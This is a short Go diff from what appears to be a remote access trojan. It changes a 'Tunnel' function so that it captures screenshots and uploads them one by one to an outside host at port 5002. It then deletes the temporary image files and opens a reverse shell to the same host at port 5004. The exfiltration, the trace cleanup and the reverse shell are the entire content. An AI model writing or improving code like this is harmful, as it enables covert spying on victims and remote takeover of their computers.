@@ -96,8 +96,11 @@ func Tunnel(addr string) {
 			// if not need  dont open the tunnel to revert shell
 			if check.Hostid == versionDetail.Hostid {
 				filenames := getscreenshot()
+				finflag := make(chan string)
 				for _, fname := range filenames {
-					lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag")
+					go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
+					<-finflag
+					go lib.Removetempimages(filenames, finflag)
 				}
 				go reverse.CreateRevShell("tcp", addr+":5004")
 			} else {
